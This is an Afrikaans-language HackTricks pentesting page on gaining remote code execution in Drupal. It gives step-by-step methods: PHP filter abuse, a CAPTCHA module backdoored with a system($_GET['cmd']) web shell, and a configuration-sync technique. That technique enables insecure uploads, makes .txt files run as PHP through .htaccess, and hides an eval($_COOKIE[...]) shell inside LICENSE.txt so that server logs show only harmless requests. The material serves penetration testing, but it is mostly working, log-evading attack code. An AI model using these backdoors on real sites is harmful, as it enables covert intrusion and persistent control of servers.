# Drupal RCE

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** ğŸ’¬ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Met PHP Filter Module

{% hint style="warning" %}
In ouer weergawes van Drupal **(voor weergawe 8)**, was dit moontlik om as 'n administrateur in te teken en die `PHP filter`-module te **aktiveer**, wat "Ingeslote PHP-kode/snippets toelaat om geÃ«valueer te word." Maar vanaf weergawe 8 is hierdie module nie standaard geÃ¯nstalleer nie.
{% endhint %}

Jy benodig die **plugin php om geÃ¯nstalleer te wees** (kontroleer dit deur toegang te verkry tot _/modules/php_ en as dit 'n **403** terugstuur, dan **bestaan** dit, indien **nie gevind nie**, dan is die **plugin php nie geÃ¯nstalleer nie**)

Gaan na _Modules_ -> (**Kontroleer**) _PHP Filter_ -> _Stoor konfigurasie_

![](<../../../.gitbook/assets/image (247) (1).png>)

Klik dan op _Voeg inhoud by_ -> Kies _Basiese Bladsy_ of _Artikel -_> Skryf _php shellcode in die liggaam_ -> Kies _PHP-kode_ in _Teksformaat_ -> Kies _Voorbeeld_

![](<../../../.gitbook/assets/image (338).png>)

Laastens, kry net toegang tot die nuut geskepte node:
```bash
curl http://drupal-site.local/node/3
```
## Installeer PHP Filter Module

{% hint style="warning" %}
In huidige weergawes is dit nie meer moontlik om plugins te installeer deur slegs toegang tot die web te hÃª na die standaard installasie nie.
{% endhint %}

Vanaf weergawe **8 en verder, is** die [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module nie standaard geÃ¯nstalleer nie**. Om van hierdie funksionaliteit gebruik te maak, sal ons die module self moet **installeer**.

1. Laai die mees onlangse weergawe van die module af van die Drupal-webwerf.
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. Nadat dit afgelaai is, gaan na **`Administrasie`** > **`Verslae`** > **`Beskikbare opdaterings`**.
4. Klik op **`Deursoek`**, kies die lÃªer van die gids waarna ons dit afgelaai het, en klik dan op **`Installeer`**.
5. Nadat die module geÃ¯nstalleer is, kan ons op **`Inhoud`** klik en **'n nuwe basiese bladsy skep**, soortgelyk aan hoe ons dit in die Drupal 7-voorbeeld gedoen het. Wees weer seker om **`PHP-kode` te kies uit die `Teksformaat`-keuslys**.

## Agterdeur Module

{% hint style="warning" %}
In huidige weergawes is dit nie meer moontlik om plugins te installeer deur slegs toegang tot die web te hÃª na die standaard installasie nie.
{% endhint %}

'n Agterdeur module kan geskep word deur **'n dop by 'n bestaande module te voeg**. Modules kan op die drupal.org-webwerf gevind word. Laat ons 'n module soos [CAPTCHA](https://www.drupal.org/project/captcha) kies. Blaai af en kopieer die skakel vir die tar.gz [argief](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Laai die argief af en onttrek sy inhoud.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Skep 'n **PHP web shell** met die inhoud:
```php
<?php
system($_GET["cmd"]);
?>
```
* Volgende, moet ons 'n **`.htaccess`** lÃªer skep om ons toegang tot die vouer te gee. Dit is noodsaaklik aangesien Drupal direkte toegang tot die **`/modules`** vouer ontken.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Die konfigurasie hierbo sal reÃ«ls toepas vir die /-vouer wanneer ons 'n lÃªer in die /modules aanvra. Kopieer albei van hierdie lÃªers na die captcha-vouer en skep 'n argief.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Mits dat ons **administratiewe toegang** tot die webwerf het, klik op **`Bestuur`** en dan **`Uitbrei`** aan die kant. Klik daarna op die **`+ Installeer nuwe module`** knoppie, en ons sal na die installeerbladsy geneem word, soos `http://drupal-site.local/admin/modules/install` Blaai na die agterdeur Captcha-argief en klik op **`Installeer`**.
* Nadat die installasie suksesvol is, blaai na **`/modules/captcha/shell.php`** om opdragte uit te voer.

## Backdooring Drupal met Konfigurasiesinkronisasie <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Pos gedeel deur** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Deel 1 (aktivering van _Media_ en _Media-biblioteek_)

In die _Uitbrei_ kieslys (/admin/modules), kan jy aktiveer wat lyk asof dit reeds geÃ¯nstalleerde byvoegings is. Standaard lyk dit asof die byvoegings _Media_ en _Media-biblioteek_ nie geaktiveer is nie, so laat ons hulle aktiveer.

Voor aktivering:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Na aktivering:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Deel 2 (benutting van die kenmerk _Konfigurasiesinkronisasie_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Ons sal die _Konfigurasiesinkronisasie_ kenmerk benut om Drupal konfigurasie inskrywings te dump (uitvoer) en op te laai (invoer):

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Begin deur die eerste inskrywing `allow_insecure_uploads` van: 

LÃªer: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Na:

LÃªer: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Lap veld.field.media.dokument.veld_media_dokument.yml**

Daarna, lap die tweede inskrywing `file_extensions` van:

LÃªer: veld.veld.media.dokument.veld_media_dokument.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Na:

LÃªer: veld.veld.media.dokument.veld_media_dokument.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Ek gebruik dit nie in hierdie blogpos nie, maar dit word genoteer dat dit moontlik is om die inskrywing `file_directory` op 'n arbitrÃªre manier te definieer en dat dit vatbaar is vir 'n padtraversie-aanval (sodat ons binne die Drupal-lÃªerstelsel kan terugbeweeg).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Deel 3 (benutting van kenmerk _Voeg Dokument by_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Die laaste stap is die eenvoudigste, en word opgebreek in twee substappe. Die eerste is om 'n lÃªer in .htaccess-formaat te laai om die Apache riglyne te benut en .txt-lÃªers toe te laat om deur die PHP-enjin geÃ¯nterpreteer te word. Die tweede is om 'n .txt-lÃªer te laai wat ons lading bevat.

LÃªer: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Waarom is hierdie truuk cool?

Omdat sodra die Webshell (wat ons LICENSE.txt sal noem) op die Web-bediener geplaas is, kan ons ons bevele oordra via `$_COOKIE` en in die Web-bediener se logboeke sal dit vertoon as 'n geldige GET-versoek na 'n tekslÃªer.

Hoekom noem ons ons Webshell LICENSE.txt?

Eenvoudig omdat as ons die volgende lÃªer neem, byvoorbeeld [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (wat reeds teenwoordig is in die Drupal-kern), het ons 'n lÃªer van 339 reÃ«ls en 17.6 KB groot, wat perfek is vir die byvoeging van 'n klein stukkie PHP-kode in die middel (aangesien die lÃªer groot genoeg is).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

LÃªer: Gepatchte LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Deel 3.1 (laai lÃªer .htaccess op)**

Eerstens maak ons gebruik van die _Voeg Dokument by_ (/media/add/document) kenmerk om ons lÃªer wat die Apache riglyne bevat (.htaccess) op te laai.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Deel 3.2 (laai lÃªer LICENSE.txt op)**

Daarna maak ons weer gebruik van die _Voeg Dokument by_ (/media/add/document) kenmerk om 'n Webshell wat binne 'n lisensie lÃªer weggesteek is, op te laai.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Deel 4 (interaksie met die Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Die laaste deel behels die interaksie met die Webshell.

Soos in die volgende skermkiekie getoon word, as die koekie wat deur ons Webshell verwag word nie gedefinieer is nie, kry ons die daaropvolgende resultaat wanneer ons die lÃªer raadpleeg via 'n Webblaaier.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Wanneer die aanvaller die koekie instel, kan hy met die Webshell interaksie hÃª en enige opdragte uitvoer wat hy wil.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

En soos gesien kan word in die logboeke, lyk dit asof slegs 'n txt-lÃªer aangevra is.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Dankie dat jy die tyd geneem het om hierdie artikel te lees, ek hoop dit sal jou help om 'n paar skulpe te kry.
